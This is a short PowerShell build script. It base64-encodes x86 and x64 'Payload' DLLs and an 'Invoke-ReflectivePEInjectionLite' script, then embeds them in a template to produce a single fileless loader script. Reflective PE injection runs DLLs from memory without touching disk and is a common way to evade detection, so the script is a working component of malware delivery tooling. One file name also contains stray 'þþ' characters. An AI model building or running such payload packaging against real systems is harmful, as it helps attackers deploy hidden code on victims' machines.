$x86PayloadBytes=[System.IO.File]::ReadAllBytes($PSScriptRoot.ToString()+'\BuildOutput\x86Payload.dll')
$x86PayloadBASE64=[Convert]::ToBase64String($x86PayloadBytes)
$x64PayloadBytes=[System.IO.File]::ReadAllBytes($PSScriptRoot.ToString()+'\BuildOutput\x64Payload.dll')
$x64PayloadBASE64=[Convert]::ToBase64String($x64PayloadBytes)
$InvokeBytes=[IO.File]::ReadAllBytes($PSScriptRoot+'\PowerShell\þþInvoke-ReflectivePEInjectionLite.ps1')
$InvokeBASE64=[Convert]::ToBase64String($InvokeBytes)
$daemonFile=Get-Content $PSScriptRoot'\PowerShell\daemon-integration.ps1'
$outputFile=$PSScriptRoot.ToString()+"\PowerShell\Output\fullScript.ps1"
New-Item $outputFile -ItemType file -Force
$daemonFile[0]|Out-File -Encoding utf8 -FilePath $outputFile -Append
'$x64PayStringBase64="'+$x64PayloadBASE64+'"'|Out-File -Encoding utf8 -FilePath $outputFile -Append
'$x86PayStringBase64="'+$x86PayloadBASE64+'"'|Out-File -Encoding utf8 -FilePath $outputFile -Append
'$InvokeStringBase64="'+$InvokeBASE64+'"'|Out-File -Encoding utf8 -FilePath $outputFile -Append
$daemonFile[4..($daemonFile.Length-1)]|Out-File -Encoding utf8 -FilePath $outputFile -Append